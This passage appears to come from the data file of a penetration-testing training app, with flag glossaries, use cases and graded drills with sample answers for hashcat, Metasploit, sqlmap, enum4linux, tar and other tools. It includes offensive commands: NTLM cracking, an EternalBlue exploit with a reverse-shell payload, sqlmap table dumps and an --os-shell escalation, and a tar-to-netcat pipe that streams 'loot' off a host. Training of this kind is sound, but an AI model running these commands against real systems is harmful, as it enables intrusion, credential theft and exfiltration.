        { flag: "-a 3", meaning: "Attack mode: brute-force/mask — generate candidates from a character-set pattern instead of a wordlist." },
        { flag: "--show", meaning: "After a session, print any hashes already cracked without re-running the attack." },
        { flag: "-r <rules file>", meaning: "Applies transformation rules (capitalize, append digits, leet-speak substitutions) to each wordlist word, multiplying its effective coverage." },
      ],
      referenceBlock: [
        "hashcat -m <mode> -a 0 hashes.txt wordlist.txt   — dictionary attack against a hash list",
        "hashcat -m 1000 hashes.txt wordlist.txt          — mode 1000 = NTLM",
      ],
      useCases: [
        "hashcat -m 0 hashes.txt rockyou.txt -r best64.rule   — dictionary attack with common mutation rules applied",
        "hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d          — brute-force a 6-digit numeric password",
        "hashcat -m 1000 hashes.txt --show                     — see what's already been cracked from a prior run",
      ],
      drills: [
        {
          id: "hashcat-01",
          scenario: "Crack a file of NTLM hashes (hashes.txt) using rockyou.txt as the wordlist.",
          accepted: { requires: ["hashcat", "-m", "1000", "hashes.txt", "rockyou.txt"] },
          sampleAnswer: "hashcat -m 1000 hashes.txt rockyou.txt",
          explain:
            "-m 1000 tells hashcat exactly which algorithm to apply to each guess — NTLM in this case. This is the single most important flag: pick the wrong hash type and hashcat runs at full speed producing zero correct results, because it's hashing candidates the wrong way entirely.",
        },
        {
          id: "hashcat-02",
          scenario: "Same attack, but explicitly specify a straight dictionary attack (attack mode 0).",
          accepted: { requires: ["hashcat", "-m", "1000", "-a", "0", "hashes.txt", "rockyou.txt"] },
          sampleAnswer: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt",
          explain:
            "-a 0 is the default straight/dictionary mode and is often left implicit, but typing it explicitly is worth the habit — it's the flag you'll swap to -a 3 the moment a wordlist alone isn't cutting it and you need to brute-force a known pattern instead.",
        },
        {
          id: "hashcat-03",
          scenario: "Brute-force a 6-digit numeric password against an NTLM hash, with no wordlist at all.",
          accepted: { requires: ["hashcat", "-m", "1000", "-a", "3", "hashes.txt"] },
          sampleAnswer: "hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d",
          explain: "-a 3 switches to mask/brute-force mode, generating candidates from a character-set pattern (?d = digit) instead of a wordlist — the right tool when you know the password's shape but not its value.",
        },
        {
          id: "hashcat-04",
          scenario: "Check what's already been cracked from a previous session without re-running the attack.",
          accepted: { requires: ["hashcat", "-m", "1000", "hashes.txt", "--show"] },
          sampleAnswer: "hashcat -m 1000 hashes.txt --show",
          explain: "--show just reads hashcat's own potfile of already-cracked results — instant, and avoids re-running a lengthy attack just to check progress.",
        },
        {
          id: "hashcat-05",
          scenario: "Apply common mutation rules (capitalization, digit-appending) to a dictionary attack against NTLM hashes.",
          accepted: { requires: ["hashcat", "-m", "1000", "hashes.txt", "rockyou.txt", "-r"] },
          sampleAnswer: "hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule",
          explain: "-r applies a rules file to every wordlist word, generating variations like Password1! without needing a separately generated giant wordlist — often cracks far more than the raw dictionary alone.",
        },
      ],
    },
    {
      id: "msfconsole",
      rank: 20,
      name: "msfconsole",
      useCount: 0,
      realWorldOnly: true,
      blurb: "The Metasploit Framework's interactive console — search, configure, and fire off exploit modules without writing them from scratch.",
      howItWorks:
        "Metasploit packages known vulnerabilities as reusable modules — each one encodes the exploit logic, the options it needs (target, port, payload), and how to deliver a payload once the exploit lands. msfconsole is the interactive shell that ties all of this together: load a module, configure its options, and it handles the mechanics of sending the exploit and catching the resulting session.",
      flagGlossary: [
        { flag: "search <term>", meaning: "Full-text search across every module's name and description." },
        { flag: "use <module>", meaning: "Loads a module, making its options configurable via set." },
        { flag: "show options", meaning: "Lists every configurable option for the currently loaded module, and which are still unset." },
        { flag: "set <OPTION> <value>", meaning: "Configures one option on the loaded module (e.g. RHOSTS, LHOST, PAYLOAD)." },
        { flag: "run / exploit", meaning: "Executes the loaded, configured module." },
        { flag: "sessions -l", meaning: "Lists active sessions from successful exploitation, so you can interact with one later." },
      ],
      referenceBlock: [
        "msfconsole                     — launch the framework",
        "search type:exploit <keyword>  — find a module",
        "use <module/path>              — load a module",
        "set RHOSTS <ip>                — point it at a target",
        "run                            — fire it",
      ],
      useCases: [
        "show options              — see every configurable field on the currently loaded module",
        "set PAYLOAD windows/meterpreter/reverse_tcp   — choose what code runs once the exploit succeeds",
        "sessions -i 1              — interact with an already-open session by its ID",
      ],
      drills: [
        {
          id: "msfconsole-01",
          scenario: "Inside msfconsole, search for exploit modules related to eternalblue.",
          accepted: { requires: ["search", "eternalblue"] },
          sampleAnswer: "search type:exploit eternalblue",
          explain:
            "search filters the framework's thousands of modules down to a manageable shortlist by keyword — real engagements almost always start here rather than knowing a module's exact path from memory.",
        },
        {
          id: "msfconsole-02",
          scenario: "Load the module exploit/windows/smb/ms17_010_eternalblue.",
          accepted: { requires: ["use", "exploit/windows/smb/ms17_010_eternalblue"] },
          sampleAnswer: "use exploit/windows/smb/ms17_010_eternalblue",
          explain:
            "use loads exactly one module into the current context, which is what makes its specific options (RHOSTS, payload choice, etc.) appear when you run show options or try to set them — nothing is configurable until a module is loaded.",
        },
        {
          id: "msfconsole-03",
          scenario: "Point the loaded module's RHOSTS option at target 10.10.10.5.",
          accepted: { requires: ["set", "rhosts", "10.10.10.5"] },
          sampleAnswer: "set RHOSTS 10.10.10.5",
          explain:
            "set RHOSTS assigns the target IP to the module's remote-host option; run (or the older alias exploit) is the command that finally sends the crafted exploit traffic and, if it succeeds, hands you a session.",
        },
        {
          id: "msfconsole-04",
          scenario: "See every configurable option on the currently loaded module, including which ones are still unset.",
          accepted: { requires: ["show", "options"] },
          sampleAnswer: "show options",
          explain: "show options is your checklist before firing anything — it flags exactly what's still required (usually RHOSTS at minimum) versus what already has a sane default.",
        },
        {
          id: "msfconsole-05",
          scenario: "List every active session from modules that have already succeeded.",
          accepted: { requires: ["sessions", "-l"] },
          sampleAnswer: "sessions -l",
          explain: "sessions -l is how you keep track once you've popped more than one target — each session gets an ID you can later interact with directly via sessions -i <id>.",
        },
      ],
    },
    {
      id: "sqlmap",
      rank: 21,
      name: "sqlmap",
      useCount: 0,
      realWorldOnly: true,
      blurb: "Automates SQL injection detection and exploitation against a URL parameter — turns a manual, painstaking process into one command.",
      howItWorks:
        "sqlmap automates what a manual SQL injection test looks like: it sends a series of crafted payloads through the parameter you point it at and studies how the application's response changes (timing, error messages, content differences) to detect whether — and how — the underlying query can be manipulated. Once injection is confirmed, it can automatically enumerate database names, tables, columns, and dump data, all through that same injection point.",
      flagGlossary: [
        { flag: "-u <url>", meaning: "The target URL, including the parameter to test (sqlmap tests every GET parameter present by default)." },
        { flag: "--dbs", meaning: "Enumerate the names of every database visible to the injected account." },
        { flag: "-D <db>", meaning: "Selects a specific database for a follow-up action like --tables or --dump." },
        { flag: "-T <table>", meaning: "Selects a specific table within the chosen database." },
        { flag: "--dump", meaning: "Extracts and prints the actual row data from the selected table." },
        { flag: "--batch", meaning: "Runs non-interactively, accepting sqlmap's default answer to every prompt instead of asking you." },
        { flag: "--risk / --level", meaning: "Controls how aggressive (and how many) payloads sqlmap tries — higher finds more but is louder and slower." },
      ],
      referenceBlock: [
        'sqlmap -u "http://<ip>/item?id=1"                      — test a GET parameter for injection',
        'sqlmap -u "http://<ip>/item?id=1" --dbs                — enumerate databases once injection is confirmed',
        'sqlmap -u "http://<ip>/item?id=1" --dump -D <db> -T <table>  — dump a specific table',
      ],
      useCases: [
        "sqlmap -u \"http://<ip>/item?id=1\" --batch --risk=3 --level=5   — a thorough, non-interactive sweep",
        'sqlmap -u "http://<ip>/item?id=1" --os-shell                   — attempt to escalate a confirmed injection into a full OS shell',
        "sqlmap -r request.txt --dbs                                     — feed sqlmap a raw captured HTTP request file instead of building the URL by hand",
      ],
      drills: [
        {
          id: "sqlmap-01",
          scenario: "Test whether the id parameter on http://<ip>/item?id=1 is SQL-injectable.",
          accepted: { requires: ["sqlmap", "-u", "item?id=1"] },
          sampleAnswer: 'sqlmap -u "http://<ip>/item?id=1"',
          explain:
            "-u hands sqlmap the exact URL and parameter to test — it then automates dozens of injection payload variants against that one spot, work that would otherwise mean manually trying quotes, comments, and boolean/time-based probes one at a time.",
        },
        {
          id: "sqlmap-02",
          scenario: "Injection is confirmed. List the available databases.",
          accepted: { requires: ["sqlmap", "-u", "item?id=1", "--dbs"] },
          sampleAnswer: 'sqlmap -u "http://<ip>/item?id=1" --dbs',
          explain:
            "--dbs only runs once sqlmap has already confirmed injection exists; it enumerates every database name the injected database account can see, which becomes your map for exactly where to dig next.",
        },
        {
          id: "sqlmap-03",
          scenario: "Dump the users table from the app database.",
          accepted: { requires: ["sqlmap", "-u", "item?id=1", "--dump", "-d", "app", "-t", "users"] },
          sampleAnswer: 'sqlmap -u "http://<ip>/item?id=1" --dump -D app -T users',
          explain:
            "-D and -T scope a --dump to one specific table instead of the (very slow, very noisy) default of trying to pull everything — you'll almost always want to enumerate tables first, then dump only the ones that look interesting.",
        },
        {
          id: "sqlmap-04",
          scenario: "Run a thorough, fully non-interactive sweep against the same target with elevated risk and detection level.",
          accepted: { requires: ["sqlmap", "-u", "item?id=1", "--batch", "--risk", "--level"] },
          sampleAnswer: 'sqlmap -u "http://<ip>/item?id=1" --batch --risk=3 --level=5',
          explain: "--batch removes every interactive prompt so the scan can run unattended; --risk and --level both raise how aggressive and thorough sqlmap's payload set is — more coverage, but louder and slower too.",
        },
      ],
    },
    {
      id: "openssl",
      rank: 22,
      name: "openssl",
      useCount: 0,
      realWorldOnly: true,
      blurb: "The Swiss-army knife for anything TLS/crypto — inspecting a certificate, testing a handshake, or hashing a file all go through openssl.",
      howItWorks:
        "openssl is a general-purpose cryptography toolkit exposed as a command line — s_client specifically opens a raw TLS connection the same way a browser would, but instead of rendering a page, it prints the full certificate chain and handshake details for you to inspect directly. x509 operates on certificate files themselves, parsing their ASN.1-encoded structure into human-readable fields.",
      flagGlossary: [
        { flag: "s_client -connect <host>:<port>", meaning: "Opens a manual TLS connection and dumps the certificate chain and handshake info." },
        { flag: "x509 -in <file>", meaning: "Reads a certificate file (PEM format expected by default)." },
        { flag: "-text", meaning: "Prints the certificate's fields (issuer, subject, validity dates, SANs) in human-readable form." },
        { flag: "-noout", meaning: "Suppresses printing the raw base64-encoded certificate block, leaving just the parsed fields." },
        { flag: "enc -aes-256-cbc", meaning: "Symmetric encryption using AES in CBC mode — one of many cipher options openssl supports." },
      ],
      referenceBlock: [
        "openssl s_client -connect <ip>:443             — manually inspect a TLS handshake/certificate",
        "openssl x509 -in cert.pem -text -noout          — read a certificate file's details",
      ],
      useCases: [
        "openssl x509 -in cert.pem -noout -dates       — just the validity window, for a quick expiry check",
        "echo | openssl s_client -connect <ip>:443 2>/dev/null | openssl x509 -noout -subject  — grab just a live site's certificate subject",
        "openssl rand -hex 16                          — generate a random value, handy for crafting a unique payload marker",
      ],
      drills: [
        {
          id: "openssl-01",
          scenario: "Connect to <ip> on port 443 to manually inspect its TLS certificate and handshake.",
          accepted: { requires: ["openssl", "s_client", "-connect", "<ip>:443"] },
          sampleAnswer: "openssl s_client -connect <ip>:443",
          explain:
            "s_client performs the actual TLS handshake a browser would, then dumps the complete certificate chain instead of silently trusting it and moving on — useful whenever curl's summary output isn't giving you enough detail about what's actually being presented.",
        },
        {
          id: "openssl-02",
          scenario: "Read the full details of a certificate file saved as cert.pem.",
          accepted: { requires: ["openssl", "x509", "-in", "cert.pem", "-text", "-noout"] },
          sampleAnswer: "openssl x509 -in cert.pem -text -noout",
          explain:
            "-text decodes the certificate's binary ASN.1 structure into readable fields; -noout suppresses the raw base64 PEM block underneath, which you almost never need to actually look at once it's been parsed.",
        },
        {
          id: "openssl-03",
          scenario: "Encrypt a local file named secret.txt with AES-256-CBC, saving the result as secret.enc.",
          accepted: { requires: ["openssl", "enc", "-aes-256-cbc", "-in", "secret.txt", "-out", "secret.enc"] },
          sampleAnswer: "openssl enc -aes-256-cbc -in secret.txt -out secret.enc",
          explain: "enc is openssl's generic symmetric-cipher interface — you'll be prompted for a passphrase, which is then used to derive the actual encryption key.",
        },
      ],
    },
    {
      id: "dig",
      rank: 23,
      name: "dig",
      useCount: 0,
      realWorldOnly: true,
      blurb: "DNS lookup tool — the standard for enumerating a domain's records during recon, far more scriptable than nslookup.",
      howItWorks:
        "dig sends a DNS query directly to a resolver and prints the full, raw answer — unlike a browser's silent DNS lookup, you see the actual query type, the answer section, and (if you ask) which server actually answered. Different record types expose different infrastructure: A records give you IPs, MX records give you mail servers, NS records give you the authoritative name servers themselves.",
      flagGlossary: [
        { flag: "<domain>", meaning: "The name to query — defaults to an A record lookup if no type is given." },
        { flag: "<TYPE>", meaning: "The DNS record type to request: A, MX, NS, TXT, CNAME, ANY, etc." },
        { flag: "-x <ip>", meaning: "Reverse lookup mode — queries for the PTR record mapping an IP back to a hostname." },
        { flag: "@<server>", meaning: "Query a specific DNS server directly instead of your system's configured resolver." },
        { flag: "+short", meaning: "Prints only the answer value, stripping all the surrounding query/timing metadata." },
      ],
      referenceBlock: ["dig <domain>       — A record lookup", "dig <domain> MX    — mail server records", "dig -x <ip>        — reverse lookup"],
      useCases: [
        "dig target-corp.com NS               — find the domain's authoritative name servers",
        "dig target-corp.com TXT              — TXT records often reveal SPF rules, verification tokens, or subdomain hints",
        "dig @8.8.8.8 target-corp.com         — query Google's resolver directly instead of your own",
        "dig target-corp.com +short           — just the answer, no metadata — great for scripting",
      ],
      drills: [
        {
          id: "dig-01",
          scenario: "Look up the A record for target-corp.com.",
          accepted: { requires: ["dig", "target-corp.com"] },
          sampleAnswer: "dig target-corp.com",
          explain: "A bare dig <domain> defaults to an A record query, resolving the domain to its IPv4 address — the most basic and most common lookup you'll do.",
        },
        {
          id: "dig-02",
          scenario: "Find the mail servers for target-corp.com.",
          accepted: { requires: ["dig", "target-corp.com", "mx"] },
          sampleAnswer: "dig target-corp.com MX",
          explain:
            "Appending a record type changes what dig actually asks for — MX specifically reveals a domain's mail infrastructure, which is very often hosted by a completely different provider than the main website, expanding your attack surface.",
        },
        {
          id: "dig-03",
          scenario: "Do a reverse lookup on 203.0.113.10 to find its hostname.",
          accepted: { requires: ["dig", "-x", "203.0.113.10"] },
          sampleAnswer: "dig -x 203.0.113.10",
          explain:
            "-x flips the query direction — instead of name-to-IP, it's IP-to-name, looking up the PTR record. Not every IP has one configured, but when it exists it can reveal internal naming conventions or unlisted hosts.",
        },
        {
          id: "dig-04",
          scenario: "Query Google's DNS resolver (8.8.8.8) directly for target-corp.com's A record instead of your system's default resolver.",
          accepted: { requires: ["dig", "@8.8.8.8", "target-corp.com"] },
          sampleAnswer: "dig @8.8.8.8 target-corp.com",
          explain: "@<server> overrides which resolver actually answers the query — useful for comparing what a public resolver returns against what a target's own, possibly split-horizon, DNS server would answer.",
        },
        {
          id: "dig-05",
          scenario: "Get just the plain answer for target-corp.com's A record, with no surrounding metadata, for use in a script.",
          accepted: { requires: ["dig", "target-corp.com", "+short"] },
          sampleAnswer: "dig target-corp.com +short",
          explain: "+short strips away the query/timing/authority sections and prints only the answer value itself — the format you want when piping dig's output into another command.",
        },
      ],
    },
    {
      id: "ss",
      rank: 24,
      name: "ss",
      useCount: 0,
      realWorldOnly: true,
      blurb: "Lists active network connections and listening ports on the local box — the first thing to check once you have a shell, to see what's actually reachable.",
      howItWorks:
        "ss reads the kernel's own socket tables directly (a faster, more modern replacement for netstat) and reports every network connection and listening socket on the local machine, along with which process owns each one. It's a purely local view — it tells you what your own box is doing on the network, which is essential context the moment you land a shell on any target.",
      flagGlossary: [
        { flag: "-t / -u", meaning: "Show TCP / UDP sockets respectively." },
        { flag: "-l", meaning: "Restrict to listening sockets only, hiding established connections." },
        { flag: "-p", meaning: "Show the process (name and PID) that owns each socket — usually needs root to see other users' processes." },
        { flag: "-n", meaning: "Skip reverse-DNS and service-name resolution, showing raw IPs and port numbers (much faster on a slow network)." },
        { flag: "-a", meaning: "Show all sockets, both listening and established." },
      ],
      referenceBlock: ["ss -tulpn   — all TCP/UDP listening ports with the owning process"],
      useCases: [
        "ss -tn state established     — just active outbound/inbound TCP connections, no listeners",
        "ss -tlp                      — listening TCP ports with owning process, DNS names resolved",
        "ss -s                        — a quick summary: total socket counts by type",
      ],
      drills: [
        {
          id: "ss-01",
          scenario: "List every listening TCP and UDP port on the box you just got a shell on, along with the process using each one.",
          accepted: { requires: ["ss", "-tulpn"] },
          sampleAnswer: "ss -tulpn",
          explain:
            "-t and -u together cover both TCP and UDP; -l narrows that to listening sockets rather than active conversations; -p adds the owning process so you know exactly what's behind each port; -n skips slow DNS lookups that would otherwise stall the output on a box with no working resolver.",
        },
        {
          id: "ss-02",
          scenario: "List every TCP socket on the box, both listening and already-established, with DNS resolution skipped.",
          accepted: { requires: ["ss", "-tan"] },
          sampleAnswer: "ss -tan",
          explain: "-a includes every socket state, not just listeners — necessary if you also want to see active outbound/inbound conversations, not only what's waiting for a connection.",
        },
      ],
    },
    {
      id: "base64",
      rank: 25,
      name: "base64",
      useCount: 0,
      realWorldOnly: true,
      blurb: "Encodes and decodes base64 — used constantly to smuggle binary payloads through text-only channels (URLs, JSON fields, command arguments).",
      howItWorks:
        "base64 re-encodes arbitrary binary data as a restricted set of 64 printable ASCII characters, in fixed groups, so it can safely pass through systems that only handle text — URLs, JSON fields, email bodies, command-line arguments. It's explicitly not encryption or obfuscation in any meaningful security sense: anyone can decode it in one command, which is exactly why it's used for transport compatibility, not for hiding anything from a determined reader.",
      flagGlossary: [
        { flag: "(no flag)", meaning: "Encodes input to base64 — the default mode." },
        { flag: "-d", meaning: "Decodes base64 input back to its original raw bytes." },
        { flag: "-w 0", meaning: "Disables line-wrapping in the output (base64 normally wraps at 76 characters) — important when the result needs to be one unbroken string, e.g. in a URL." },
      ],
      referenceBlock: ["base64 <file>              — encode a file to base64 text", "echo '<text>' | base64 -d  — decode a base64 string back to raw text"],
      useCases: [
        "base64 -w 0 payload.txt              — encode with no line breaks, for pasting into a single-line context",
        "curl http://<ip>/file | base64 -d > file  — decode a base64 response straight into a real file",
        "echo -n 'text' | base64               — encode a literal string (-n avoids echo adding a trailing newline)",
      ],
      drills: [
        {
          id: "base64-01",
          scenario: "Encode a local file named payload.sh to base64 text so it can be pasted into a web form.",
          accepted: { requires: ["base64", "payload.sh"] },
          sampleAnswer: "base64 payload.sh",
          explain:
            "Plain base64 <file> reads the file's raw bytes and re-encodes them as printable text on stdout — the same operation you'd do to smuggle a binary payload through a channel that only accepts text, like a URL parameter or a JSON string field.",
        },
        {
          id: "base64-02",
          scenario: "You captured a base64 string 'aGVsbG8=' from a request. Decode it back to plaintext.",
          accepted: { requires: ["echo", "aGVsbG8=", "base64", "-d"] },
          sampleAnswer: "echo 'aGVsbG8=' | base64 -d",
          explain:
            "-d switches base64 into decode mode, reversing the encoding back to the original bytes; piping a short string through echo first is the fastest way to decode a single captured value without creating a temporary file.",
        },
        {
          id: "base64-03",
          scenario: "Encode payload.bin with no line-wrapping, so the result is one unbroken string safe to paste into a URL.",
          accepted: { requires: ["base64", "-w", "0", "payload.bin"] },
          sampleAnswer: "base64 -w 0 payload.bin",
          explain: "base64 normally wraps its output at 76 characters for readability — -w 0 disables that, which matters the moment the encoded string needs to survive as one unbroken token, like a URL parameter.",
        },
      ],
    },
    {
      id: "enum4linux",
      rank: 26,
      name: "enum4linux",
      useCount: 0,
      realWorldOnly: true,
      blurb: "One-stop SMB/Active Directory enumeration — users, groups, shares, and password policy from a single command against a Windows host.",
      howItWorks:
        "enum4linux wraps a whole suite of lower-level SMB tools (smbclient, rpcclient, net, nmblookup) behind one command, running each of their relevant enumeration queries in sequence and presenting the results together. Windows domains historically leak a surprising amount of information to anyone who can reach SMB — usernames, group membership, password policy, share names — often with no authentication required at all, which is exactly what -a sweeps for.",
      flagGlossary: [
        { flag: "-a", meaning: "Runs every available check: OS info, users, groups, shares, password policy, and more." },
        { flag: "-U", meaning: "Lists domain/local users only." },
        { flag: "-S", meaning: "Lists available SMB shares only." },
        { flag: "-P", meaning: "Enumerates the domain password policy specifically (lockout threshold, minimum length) — critical intel before attempting any password spray." },
      ],
      referenceBlock: ["enum4linux -a <ip>   — run every enumeration check available"],
      useCases: [
        "enum4linux -U <ip>          — just enumerate users, a faster, quieter subset of the full sweep",
        "enum4linux -S <ip>          — just enumerate available SMB shares",
        "smbclient -L //<ip> -N      — a lighter, single-purpose tool for listing shares without any of enum4linux's other checks",
      ],
      drills: [
        {
          id: "enum4linux-01",
          scenario: "Run a full enumeration sweep (users, shares, groups, policy) against a Windows host at <ip>.",
          accepted: { requires: ["enum4linux", "-a", "<ip>"] },
          sampleAnswer: "enum4linux -a <ip>",
          explain:
            "-a turns on every check enum4linux offers in one pass — users, groups, shares, and password policy — the standard first move against any exposed SMB service, since the output shapes everything you'd try next: a targeted password spray, a share to explore, a user to Kerberoast.",
        },
        {
          id: "enum4linux-02",
          scenario: "Enumerate only the domain/local users on <ip>, skipping the rest of the full sweep.",
          accepted: { requires: ["enum4linux", "-u", "<ip>"] },
          sampleAnswer: "enum4linux -U <ip>",
          explain: "-U narrows the sweep to just user enumeration — faster and quieter than -a when you already know users are what you need.",
        },
        {
          id: "enum4linux-03",
          scenario: "Enumerate only the available SMB shares on <ip>.",
          accepted: { requires: ["enum4linux", "-s", "<ip>"] },
          sampleAnswer: "enum4linux -S <ip>",
          explain: "-S narrows the sweep to shares specifically — useful once you already have users and just need to know what's exposed to browse.",
        },
        {
          id: "enum4linux-04",
          scenario: "Check the domain's password policy on <ip> before attempting any password spray.",
          accepted: { requires: ["enum4linux", "-p", "<ip>"] },
          sampleAnswer: "enum4linux -P <ip>",
          explain: "-P reveals the lockout threshold and minimum length policy — critical to check before spraying passwords, since guessing wrong too many times per account can trigger lockouts and alert the blue team.",
        },
      ],
    },
    {
      id: "tar",
      rank: 27,
      name: "tar",
      useCount: 0,
      realWorldOnly: true,
      blurb: "Archives (and compresses) files and directories — used to package loot for exfil or to unpack a downloaded tool on a target.",
      howItWorks:
        "tar (originally 'tape archive') bundles multiple files and directories into a single archive file, preserving their structure, permissions, and metadata — by itself it doesn't compress anything, which is why it's almost always combined with a compression flag like -z (gzip) in the same invocation. The same core flags work in reverse for extraction, just swapping create for extract.",
      flagGlossary: [
        { flag: "-c", meaning: "Create a new archive." },
        { flag: "-x", meaning: "Extract an existing archive." },
        { flag: "-z", meaning: "Filter the archive through gzip (compress on create, decompress on extract)." },
        { flag: "-v", meaning: "Verbose — list each file as it's processed." },
        { flag: "-f <file>", meaning: "Specifies the archive filename to operate on — required for every real invocation." },
        { flag: "-t", meaning: "List an archive's contents without extracting anything, useful for checking what's inside before you commit." },
      ],
      referenceBlock: ["tar -czvf archive.tar.gz <dir>   — compress a directory into one file", "tar -xzvf archive.tar.gz         — extract a .tar.gz archive"],
      useCases: [
        "tar -tzvf archive.tar.gz          — list an archive's contents without extracting",
        "tar -czvf - <dir> | nc <ip> <port>  — stream a compressed archive directly over the network without ever writing it to disk",
        "tar -xzvf archive.tar.gz -C /tmp/  — extract into a specific target directory instead of the current one",
      ],
      drills: [
        {
          id: "tar-01",
          scenario: "Package the directory /home/victim/loot into a single compressed archive named loot.tar.gz.",
          accepted: { requires: ["tar", "-czvf", "loot.tar.gz", "/home/victim/loot"] },
          sampleAnswer: "tar -czvf loot.tar.gz /home/victim/loot",
          explain:
            "-c creates, -z gzips, -v is verbose, -f names the output file — that exact flag ordering (czvf) is such a common idiom it's worth typing from memory rather than looking up each time.",
        },
        {
          id: "tar-02",
          scenario: "Extract a downloaded archive named tool.tar.gz in the current directory.",
          accepted: { requires: ["tar", "-xzvf", "tool.tar.gz"] },
          sampleAnswer: "tar -xzvf tool.tar.gz",
          explain:
            "Extraction mirrors creation exactly — swap -c for -x and keep the same -z/-v/-f flags, since you're reversing the same operation: decompress instead of compress, read instead of write.",
        },
        {
          id: "tar-03",
          scenario: "List the contents of archive.tar.gz without extracting anything, to check what's inside first.",
          accepted: { requires: ["tar", "-tzvf", "archive.tar.gz"] },
          sampleAnswer: "tar -tzvf archive.tar.gz",
          explain: "-t lists an archive's contents without writing anything to disk — worth doing before extracting something from an unknown or untrusted source.",
        },
        {
          id: "tar-04",
          scenario: "Create an uncompressed archive of the directory /tmp/loot, named loot.tar (no gzip).",
          accepted: { requires: ["tar", "-cvf", "loot.tar", "/tmp/loot"], forbids: ["-z"] },
          sampleAnswer: "tar -cvf loot.tar /tmp/loot",
          explain: "Dropping -z creates a plain, uncompressed archive — tar and compression are genuinely separate concerns; you only reach for -z when the size savings are worth the extra CPU time.",
        },
      ],
    },
  ],
};
